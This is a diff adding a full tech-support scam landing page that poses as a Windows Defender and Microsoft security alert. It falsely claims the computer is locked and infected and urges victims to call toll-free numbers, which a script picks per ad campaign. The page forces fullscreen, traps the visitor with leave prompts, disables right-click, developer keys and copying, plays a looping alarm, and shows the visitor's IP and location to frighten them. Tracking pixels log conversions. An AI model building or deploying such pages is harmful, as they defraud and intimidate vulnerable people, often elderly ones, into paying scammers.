@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>0nline Wind0ws Defendr Helpp Centre</title>
+
+  <link rel="icon" type="image/png" href="https://jiggijiggi.com/landers/jigsaw/01/def.png">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+        integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  <!-- Hosted styles.css -->
+  <link rel="stylesheet" href="https://jiggijiggi.com/landers/jigsaw/01/styles.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+  <!-- Hosted scripts.js -->
+  <script type="text/javascript" src="https://jiggijiggi.com/landers/jigsaw/01/scripts.js"></script>
+
+  <script>
+var elem = document.documentElement;
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+
+function closeFullscreen() {
+  if (document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if (document.webkitExitFullscreen) { /* Safari */
+    document.webkitExitFullscreen();
+  } else if (document.msExitFullscreen) { /* IE11 */
+    document.msExitFullscreen();
+  }
+}
+  </script>
+
+  <script type="text/javascript">
+  window.onbeforeunload = function() {
+     if (data_needs_saving()) {
+         return "Call Windows Defender Helpline Now";
+     } else {
+        return;
+     }
+  };
+  </script>
+  <script type="text/javascript">
+  window.addEventListener("beforeunload", function (e) {
+     var confirmationMessage = 'It looks like you are editing something. '
+                    + 'Your changes will be lost if you leave before saving.';
+        (e || window.event).returnValue = confirmationMessage;
+        return confirmationMessage;
+  });
+  </script>
+
+  <script>
+  var t = new XMLHttpRequest;
+  t.onreadystatechange = function() {
+    if (4 == this.readyState && 200 == this.status) {
+      var a = JSON.parse(this.responseText);
+      ipadd = a.ip;
+      city = a.city;
+      country = a.country;
+      isp = a.connection.isp;
+      var b = new Date;
+      currtime = a.timezone.current_time;
+      document.getElementById("ip_add").textContent = "Address IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
+      document.getElementById("city").textContent = "Location: " + city + ", " + country;
+      document.getElementById("isp").textContent = "ISP: " + isp
+    }
+  };
+  t.open("GET", "https://ipwho.is/?lang=en", !0);
+  t.send();
+  </script>
+</head>
+
+<body id="mycanvas" onclick="playSound()" style="cursor:none !important;">
+
+  <div id="age-confirmation-modal">
+    <div class="innerContainer">
+      <div>
+        <button type="button" class="close" data-dismiss="close" aria-label="Close">
+          <span aria-hidden="true">X</span>
+        </button>
+      </div>
+      <div style="font-size:40px;">
+        Do you want to close this site?
+      </div>
+      <div>
+        <button type="button" class="btn btn-secondary btn-lg">No</button>
+        <button type="button" class="btn btn-primary btn-lg blink" style="color: #fff;
+        background-color: #007bff;
+        border-color: #007bff;">Yes</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="bg">
+    <div class="bgimg" style="top: 0px;">
+      <img src="https://jiggijiggi.com/landers/jigsaw/01/7a-bg.png" alt="" width="100%"/>
+    </div>
+  </div>
+  <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+    <div class="black" style="height: 145%;"></div>
+  </a>
+
+  <audio id="beep" loop>
+    <source src="https://jiggijiggi.com/landers/jigsaw/01/_Fm7-alert.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+  addEventListener("click", function() {
+    var el = document.documentElement
+      , rfs =
+             el.requestFullScreen
+          || el.webkitRequestFullScreen
+          || el.mozRequestFullScreen
+    ;
+    rfs.call(el);
+  });
+  </script>
+<div class="alert_popup cardcontainer mnbozsx lightbox" style="cursor:none;">
+    <div id="txtintro" style="cursor:none;">
+      <h1>** Your Computer was locked **</h1>
+      <h6>Error #DT00X02.</h6>
+      <p>Call Microsoft Technical Support <b><span data-dynamic-phone>+1-000-000-0000</span></b> (Toll-Free):<br>
+        Do not ignore this important warning.<br>
+        If you close this page without resolving issue, access to your computer will be disabled to prevent further damage to our network.</p>
+      <p>Your computer has alerted us that it was infected with virus and spyware. The following data is at risk:</p>
+      <ol>
+        <li>Facebook Login</li>
+        <li>Credit Card information</li>
+        <li>Email Credentials</li>
+        <li>Browsing History and Data</li>
+      </ol>
+      <p>You must contact us immediately so our engineers can guide you through the recovery process by phone. Please call us within the next 5 minutes to prevent complete loss of your computer.</p>
+    </div>
+    <p style="padding-bottom: 0px;">Call Microsoft Windows Support <strong><span data-dynamic-phone>+1-000-000-0000</span> (Microsoft Support)</strong></p>
+    <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">OK</a> <a class="" id="leave_page">Cancel</a> </div>
+  </div>
+
+  <div id="poptxts" class="container" style="cursor:none;">
+    <div class="ilb top" style="font-size:17px">
+      <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
+        <span class="fl title" id="txtadd" style="color: #000;font-size: 18px;">
+          <span class="fl ilb">
+            <img src="https://jiggijiggi.com/landers/jigsaw/01/def.png" class="logo3">
+          </span>Windows Defender Security Center </span>
+        <span class="fl title2" id="txts1">
+          <a href="#" id="cross">
+            <img src="https://jiggijiggi.com/landers/jigsaw/01/cs.png">
+          </a>
+        </span>
+      </div>
+    </div>
+
+    <div class="lightbox2" style="cursor:none;">
+      <div class="ilb top">
+        <div class="headers ilb">
+          <div id="txtadd" class="title"><img src="https://jiggijiggi.com/landers/jigsaw/01/websw.png" class="logos">
+            Your Computer May Have A <span>Virus!</span></div>
+          <span class="colo-rd">
+            <div id="ip_add">Microsoft Windows Firewall Alert !</div>
+            <div id="city">PC infected with Trojan-type spyware</div>
+            <div id="isp"> (Error Code: 2V7HGTVB)</div>
+          </span>
+        </div>
+      </div>
+      <div class="row" style="cursor:none;">
+        <div class="col-sm-6">
+          <div class="box-grey">
+            <h3>How to Remove:</h3>
+            <div class="yellowbx" style="cursor:none;">
+              <p><b>Step 1:</b> Click on the button below to download and install PCKeeper.</p>
+              <p><b>Step 2:</b> Run PCKeeper and remove all detected threats immediately.</p>
+            </div><br>
+            <p>Seeing these pop-ups means that you may
+              have a virus installed on your computer
+              which puts the security of your personal
+              data at a serious risk. It's strongly advised
+              that you get this fixed ASAP before you
+              continue.</p>
+          </div>
+        </div>
+        <div class="col-sm-6" style="cursor:none;">
+          <div class="box-red">
+            <p>Possible network damages from potential
+              threats: <span>UNKNOWN</span></p>
+            <div class="cusft">
+              <p>Your Data Exposed to Risk:</p>
+              <p>1. Your credit card details and banking information.</p>
+              <p>2. Your email password and other account passwords.</p>
+              <p>3. Your Facebook, Skype, AIM, and other chat logs.</p>
+              <p>4. Your private photos, family photos and other sensitive files.</p>
+              <p>5. Your webcam could be accessed remotely by stalkers.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="disclaimer" style="cursor:none;">
+      Call Windows Defender Support immediately to report this threat, prevent identity theft and unlock access to this device.<br>
+      <span class="support">Contact Windows Defender Helpline:
+        <span id="dynamicPhone">+1-888-902-9808</span> (Security Support)</span>
+    </div>
+    <div id="bottom">
+      <ul>
+        <li>
+          <a href="#" style="cursor:none;">
+            <div class="button2 fr">
+              <span id="addtochromebutton">Deny</span>
+            </div>
+          </a>
+        </li>
+        <li>
+          <a href="#" style="cursor:none;">
+            <div class="buttons fr blink">
+              <span id="addtochromebutton">Allow</span>
+            </div>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+  <div id="footer" style="cursor:none;">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="right-foot" style="text-align: center;">
+          <span id="footertxt" style="font-weight:600"><img src="https://jiggijiggi.com/landers/jigsaw/01/msmm.png"> Microsoft contact support
+          </span><span style="font-weight: 700;padding-left: 13px;color: #fff;"> <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><span data-dynamic-phone>+1-000-000-0000</span> (Security Support)</span></span>
+        </div>
+      </div>
+      <div class="col-md-12">
+        <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Your security is important to us. If you are not aware of this request, please contact us immediately at submiting report.</small></marquee>
+      </div>
+    </div>
+  </div>
+
+  <div id="welcomeDiv"
+       style=" display:none; cursor:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
+       margin-top: -8px; "
+       class="answer_list">
+    <p class="text-center" style="color: #FEFEFE; margin-top:10px; font-size: 16px; opacity:.9; "> Did you need to be aware of the risks ? Do not reboot or use
+      Your Device.<br>Your Device is disabled. Please, call Microsoft Windows helpline. <br>Access to this PC has been blocked for security reason. <br>Please contact us immediately. A technician will help you resolve this problem.<strong> Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"><span data-dynamic-phone>+1-000-000-0000</span>
+      </span>
+    </strong></p>
+  </div>
+
+  <div id="chat" style="cursor:none;">
+    <img src="https://jiggijiggi.com/landers/jigsaw/01/msmm.png">
+    <span style="color:#222;font-size:24px;font-weight:700;margin-left:6px;position:relative;top:5px">Microsoft</span>
+    <p style="font-weight:700;font-size:24px"> Support: <br></p>
+    <h4 style="font-weight:700;font-size:22px"><span data-dynamic-phone>+1-000-000-0000</span>
+      <br>(Security TollFree)
+    </h4>
+    <div class="arrow-down">
+      <svg height="1em" viewBox="0 0 320 512">
+        <style>svg { fill: #fff }</style>
+        <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+      </svg>
+    </div>
+  </div>
+
+  <div id="mndiv" style="cursor:none;">
+    <div class="modal exitModal" id="exitModal1" tabindex="-1" role="dialog" style="cursor:none">
+      <div class="modal-dialog modal-full-height modal-right" role="document">
+        <div class="modal-content" style="background-color: red;color: #fff;">
+          <img id="modal-exit" src="https://jiggijiggi.com/landers/jigsaw/01/cross.png" class="modal-exit">
+          <div class="modal-body">
+            <div class="media">
+              <div class="media-left" style="padding-right: 20px; cursor:none;">
+                <img src="https://jiggijiggi.com/landers/jigsaw/01/def.png" class="media-object" style="width:30px;margin-top: 5px;-webkit-filter: brightness(0) invert(1);
+                filter: brightness(0) invert(1);">
+              </div>
+              <div class="media-body" style="cursor:none;">
+                <h5 class="media-heading">Virus and threat protection</h5>
+                <h5>Threats found</h5>
+                <p>Windows Defender Antivirus found threats. Get details.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal exitModal" id="exitModal2" tabindex="-1" role="dialog" style="cursor:none">
+      <div class="modal-dialog modal-full-height modal-right" role="document">
+        <div class="modal-content" style="background-color: red;color: #fff;">
+          <img id="modal-exit" src="https://jiggijiggi.com/landers/jigsaw/01/cross.png" class="modal-exit">
+          <div class="modal-body">
+            <div class="media">
+              <div class="media-left" style="padding-right: 20px;">
+                <img src="https://jiggijiggi.com/landers/jigsaw/01/def.png" class="media-object" style="width:30px;margin-top: 5px;-webkit-filter: brightness(0) invert(1);
+                filter: brightness(0) invert(1);">
+              </div>
+              <div class="media-body" style="cursor:none;">
+                <h5 class="media-heading">Firewall threat protection</h5>
+                <h5>Windows Defender took action</h5>
+                <p>Your settings caused Windows Defender Antivirus to block an app that may potentially perform unwanted actions on your device.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="modal exitModal" id="exitModal3" tabindex="-1" role="dialog" style="cursor:none">
+  <div class="modal-dialog modal-full-height modal-right" role="document">
+    <div class="modal-content" style="background-color: red;color: #fff;">
+      <img id="modal-exit" src="https://jiggijiggi.com/landers/jigsaw/01/cross.png" class="modal-exit">
+      <div class="modal-body">
+        <div class="media" style="cursor:none;">
+          <div class="media-body">
+            <h4 class="media-heading">Call Windows Support <br/> <span data-dynamic-phone>+1-000-000-0000</span>
+              (Security TollFree) </h4>
+            <p>Please contact us immediately. A technician will help you solve the problem.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <div id="chrome-alert4" class="chrome-alert" style="cursor:none;">
+    <span class="arrow-down">
+      <i class="fa fa-caret-up"></i>
+    </span>
+    <div style="cursor:none;">
+      <a href="javascript:openlink()" class="cross" style="font-size: 22px;">×</a>
+      <p> site wants to:</p>
+      <p class="mntxt"><img src="https://jiggijiggi.com/landers/jigsaw/01/bell.png" alt="" style="margin-right: 3px;
+      margin-top: 1px;width: 15px;
+      height: 15px;"> &nbsp; System wants to scan your computer immediately</p>
+      <div class="action_buttons">
+        <a class="bg-grey" id="leave_page">Allow</a>
+        <a class="" id="leave_page">Block</a>
+      </div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+  document.getElementById("age-confirmation-modal").onclick = function(){
+    document.getElementById("age-confirmation-modal").style.display = "none";
+    document.getElementById("other-content").style.display = "inline";
+
+    addEventListener("click", function() {
+      var
+            el = document.documentElement
+          , rfs =
+                 el.requestFullScreen
+              || el.webkitRequestFullScreen
+              || el.mozRequestFullScreen
+      ;
+      rfs.call(el);
+    });
+  }
+  $("a#thing_to_click").click(function(e){
+    e.preventDefault();
+    window.location = "#";
+  });
+  </script>
+
+  <script>
+  $(document).ready(function () {
+    $("#mycanvas").click(function () {
+      $("#welcomeDiv").show();
+    });
+  });
+  </script>
+  <script>
+  $("#mycanvas").click(function(){
+    $("#mndiv").hide();
+    $(".black").hide();
+  });
+  </script>
+
+  <script type="text/javascript">
+  // To disable right click
+  document.addEventListener('contextmenu', event => event.preventDefault());
+
+  // To disable F12 options
+  document.onkeypress = function (event) {
+    event = (event  window.event);
+    if (event.keyCode == 123) { return false; }
+  }
+  document.onmousedown = function (event) {
+    event = (event  window.event);
+    if (event.keyCode == 123) { return false; }
+  }
+  document.onkeydown = function (event) {
+    event = (event  window.event);
+    if (event.keyCode == 123) { return false; }
+  }
+
+  // To disable ctrl+c, ctrl+u
+  jQuery(document).ready(function ($) {
+    $(document).keydown(function (event) {
+      var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+      if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
+        alert('Sorry, this feature is disabled!');
+        return false;
+      }
+    });
+  });
+  </script>
+
+  <!-- ============================================================ -->
+  <!-- MultiTFN.php  →  client-side phone resolver                   -->
+  <!-- ============================================================ -->
+  <script>
+  (function () {
+    // 1) Base-domain → phone mapping (optional)
+    var baseDomainMap = {
+      // 'makermatching': '1-888-510-9875'
+    };
+
+    // 2) utm_camp → phone mapping
+    var utmCampMap = {
+      '603df950dfae4eb1a5ecda2737e0af42': '+1-888-763-1447',
+      '1e73fd1815c64b7e947a52e2472c2432': '+1-877-295-1436',
+      '8b389709054d4a5ebac27bed150113f4': '+1-877-295-1445',
+      '42c105b393e8442fbaad20561e292bd9': '+1-877-295-1451',
+      '7c0dbf2451174966922a84c4da19dce7': '+1-877-295-1461',
+      '990e1af7799447f49bf4e10ee159d9fc': '+1-877-295-1624',
+      '19189bbb377340b18059a6765d737ad9': '+1-877-295-1622',
+      'c1fb2dba403c4dc1807641935097a617': '+1-877-295-1577',
+      'c2fdf3d6ee8049369546b076f921c5d5': '+1-888-763-1447',
+      'f9ade67f238c488eb9a1c3f39dbdd19a': '+1-877-295-1436',
+      '36536c79e6c34f99bc1a5c9f1d6441fe': '+1-877-295-1445',
+      '0b8f662477c249a99cb2a56b7ae66cf7': '+1-877-295-1451',
+      '4709032766454d10a217c19000d91add': '+1-877-295-1461',
+      '3e81fb2d0195456f9d66be1c31aa44b4': '+1-877-295-1624',
+      '93d6828df56149418a746c0dc62e7c7a': '+1-877-295-1622',
+      'b725c4e750f841b9a19933e31be53283': '+1-877-295-1577'
+    };
+
+    // 3) Default fallback
+    var defaultPhone = '+1-888-902-9808';
+
+    // 4) Base domain (client-side, mimics getBaseDomainName())
+    function getBaseDomainName(host) {
+      host = (host || '').toLowerCase().replace(/^www\./, '');
+      var m = host.match(/([a-z0-9-]+)\.(?:[a-z]{2,63})(?:\.[a-z]{2,63})?$/);
+      return m ? m[1].toLowerCase() : host;
+    }
+
+    var cleanHost = window.location.hostname.toLowerCase().replace(/^www\./, '');
+    var baseDomain = getBaseDomainName(cleanHost);
+
+    // 5) Resolve phone (priority: utm_camp → base domain → default)
+    var phonenumber = defaultPhone;
+
+    var params = new URLSearchParams(window.location.search);
+    var rawToken = params.get('utm_camp');
+    if (rawToken !== null && rawToken !== '') {
+      var token = rawToken.toLowerCase().trim().replace(/[^a-z0-9]/gi, '');
+      token = token.substring(0, 32);
+      if (utmCampMap[token]) {
+        phonenumber = utmCampMap[token];
+      }
+    }
+
+    if (phonenumber === defaultPhone && baseDomainMap[baseDomain]) {
+      phonenumber = baseDomainMap[baseDomain];
+    }
+
+    // Inject into #dynamicPhone (and any element with data-phone)
+    function injectPhone() {
+      var el = document.getElementById('dynamicPhone');
+      if (el) el.textContent = phonenumber;
+      var all = document.querySelectorAll('[data-dynamic-phone]');
+      for (var i = 0; i < all.length; i++) all[i].textContent = phonenumber;
+    }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', injectPhone);
+    } else {
+      injectPhone();
+    }
+
+    // Expose globally so NetworkPixels can read it immediately
+    window.__MULTITFN_PHONE__ = phonenumber;
+  })();
+  </script>
+
+  <!-- ============================================================ -->
+  <!-- analytics.php  →  GA4 load-on-first-click                    -->
+  <!-- ============================================================ -->
+  <script>
+  function loadGAonClick() {
+    const gaMap = {
+      "seniorsoulmatch.com": "G-1Y1SDZ63K2",
+      "naughtyconneections.monster": "G-1Y1SDZ63K2",
+      "newcrushlive.monster": "G-1Y1SDZ63K2",
+    };
+
+    const currentHost = window.location.hostname.toLowerCase();
+    let matchedGA = gaMap[currentHost];
+
+    if (!matchedGA) {
+      const parts = currentHost.split('.');
+      if (parts.length >= 2) {
+        const baseDomain = parts.slice(-2).join('.');
+        matchedGA = gaMap[baseDomain];
+      }
+    }
+
+    matchedGA = matchedGA || "G-5VP9KHJ107";
+
+    const gaScript = document.createElement("script");
+    gaScript.async = true;
+    gaScript.src = `https://www.googletagmanager.com/gtag/js?id=${matchedGA}`;
+    document.head.appendChild(gaScript);
+
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+
+    gaScript.onload = function () {
+      gtag('js', new Date());
+      gtag('config', matchedGA);
+      console.log("📊 GA4 fired with ID:", matchedGA);
+    };
+  }
+
+  let hasFiredGA = false;
+  document.addEventListener("DOMContentLoaded", function () {
+    window.addEventListener("click", function () {
+      if (!hasFiredGA) {
+        hasFiredGA = true;
+        loadGAonClick();
+      }
+    });
+  });
+  </script>
+
+  <!-- ============================================================ -->
+  <!-- NetworkPixels.php  →  Binom pixel + conversion                -->
+  <!-- ============================================================ -->
+  <script>var BPixelJS;!function(){"use strict";var n={d:function(e,o){for(var t in o)n.o(o,t)&&!n.o(e,t)&&Object.defineProperty(e,t,{enumerable:!0,get:o[t]})},o:function(n,e){return Object.prototype.hasOwnProperty.call(n,e)}},e={};function o(n){!window.isPixelLoaded&&window.isPixelLoading?(window.pixelLoadedHandlers||(window.pixelLoadedHandlers=[]),window.pixelLoadedHandlers.push(n)):n()}function t(n){var e,o;return null!==(e=null===(o=window.BPIXEL_JS_CONFIG)||void 0===o?void 0:o[n])&&void 0!==e?e:void 0}function i(){var n;return(n=console).error.apply(n,arguments)}function r(n){return r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},r(n)}function a(){var n,e,o,t;return null!==(n=null!==(e=function(){if("object"!==r(window.tokens)||!window.tokens)return null;var n=window.tokens.bcid;return"string"!=typeof n?null:n}())&&void 0!==e?e:null!==(o=null==(t=document.cookie.match(new RegExp("(^|[ ;])".concat("bcid","=(.+?)(;|$)"))))?void 0:t[2])&&void 0!==o?o:null)&&void 0!==n?n:function(){var n,e,o=null!==(n=null==(e=window.location.search.match(new RegExp("(^|[&?])".concat("bcid","=(.*?)(&|$)"))))?void 0:e[2])&&void 0!==n?n:null;return"string"!=typeof o?null:o}()}function l(n,e){return"".concat(n).concat(e)}function d(n){var e=n.base,o=n.params,t=e||"?";return Object.entries(o).forEach((function(n){var e=n[0],o=n[1];"?"!==t[t.length-1]&&(t+="&"),t+="".concat(e,"=").concat(o)})),t}function u(n){var e=new Image;e.src=n,e.referrerPolicy="no-referrer-when-downgrade"}n.d(e,{default:function(){return c}});var c={config:function(n){!function(n){window.BPIXEL_JS_CONFIG=Object.assign({},window.BPIXEL_JS_CONFIG,n)}(n)},run:function(){var n,e,o,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};window.isPixelLoading=!0;var u,c,s,f=null!==(n=r.url)&&void 0!==n?n:t("url"),v=null!==(e=r.campaignKey)&&void 0!==e?e:t("campaignKey"),p=null!==(o=r.tokens)&&void 0!==o?o:{};void 0!==f?void 0!==v?(u=l(f,d({base:window.location.search,params:Object.assign({},p,{key:v,lp_type:"pixel"})})),c=function(){var n,e;window.isPixelLoading=!1,window.isPixelLoaded=!0,null===(n=window.pixelLoadedHandlers)||void 0===n||n.forEach((function(n){n()})),(e=a())?[{elements:document.querySelectorAll("a"),getHref:function(n){return n.getAttribute("href")},setHref:function(n,e){n.setAttribute("href",e)}},{elements:document.querySelectorAll("[data-href]"),getHref:function(n){return n.dataset.href||null},setHref:function(n,e){n.dataset.href=e}}].forEach((function(n){var o=n.elements,t=n.setHref,i=n.getHref;o.forEach((function(n){var o,r=i(n);r&&(/[?&]event[_\d]+=/.test(o=r)||/[?&]cnv_id=OPTIONAL(&|$)/.test(o)||/[?&]lp=(1|data_upd)(&|$)/.test(o))&&t(n,"".concat(r,"&bcid=").concat(e))}))})):i("Can't find click id")},(s=document.createElement("script")).src=u,s.async=!1,c&&(s.onload=c),document.head.appendChild(s)):i('"campaignKey" param must be passed'):i('"url" param must be passed')},update:function(){var n,e,r,c=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},s=null!==(n=c.url)&&void 0!==n?n:t("url"),f=null!==(e=c.updateKey)&&void 0!==e?e:t("updateKey"),v=null!==(r=c.tokens)&&void 0!==r?r:{};o((function(){if(void 0!==s)if(void 0!==f){var n=a();n?u(l(s,d({base:"?",params:Object.assign({},v,{upd_clickid:n,upd_key:f})}))):i("Can't find click id")}else i('"updateKey" param must be passed');else i('"url" param must be passed')}))},conversion:function(){var n,e,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},c=null!==(n=r.url)&&void 0!==n?n:t("url"),s=null!==(e=r.tokens)&&void 0!==e?e:{};o((function(){if(void 0!==c){var n=a();n||function(){var n;(n=console).warn.apply(n,arguments)}("Can't find click id"),u(l(c,d({base:"?",params:Object.assign({},s,{cnv_id:null!=n?n:"conversion_pixel"})})))}else i('"url" param must be passed')}))},onPixelLoaded:o,useTokens:function(n){o((function(){!function(n){"loading"!==document.readyState?n():document.addEventListener("DOMContentLoaded",n)}((function(){var e;n(null!==(e=window.tokens)&&void 0!==e?e:{})}))}))}};BPixelJS=e.default}();</script>
+
+  <script>
+  (function () {
+    // ── CONFIG ───────────────────────────────────────────────
+    var TRACKER_URL = window.location.protocol + '//' + window.location.hostname.split('.').slice(-2).join('.') + '/click';
+
+    // ── PHONE CAPTURE ────────────────────────────────────────
+    function readPhone() {
+      // Prefer the value resolved by MultiTFN resolver
+      if (window.__MULTITFN_PHONE__) {
+        return String(window.__MULTITFN_PHONE__).replace(/[\s\-]+/g, '');
+      }
+      var el = document.getElementById("dynamicPhone");
+      if (!el) return null;
+      var phone = el.innerText.trim().replace(/[\s\-]+/g, '');
+      return phone || null;
+    }
+
+    function waitForPhone(callback, tries) {
+      if (tries === undefined) tries = 60; // 3 seconds max
+      var phone = readPhone();
+      if (phone) {
+        callback(phone);
+      } else if (tries > 0) {
+        setTimeout(function () { waitForPhone(callback, tries - 1); }, 50);
+      } else {
+        callback("unknown");
+      }
+    }
+
+    // ── FIRE CONVERSION ──────────────────────────────────────
+    function fireConversion(phone) {
+      BPixelJS.conversion({
+        url: TRACKER_URL,
+        tokens: {
+          cnv_status:  "stay_1min",
+          cnv_status2: phone
+        }
+      });
+      console.log("✅ conversion fired | stay_1min |", phone);
+    }
+
+    // ── RUN ──────────────────────────────────────────────────
+    function start() {
+      waitForPhone(fireConversion);
+    }
+
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", start);
+    } else {
+      start();
+    }
+  })();
+  </script>
+
+</body>
+</html>
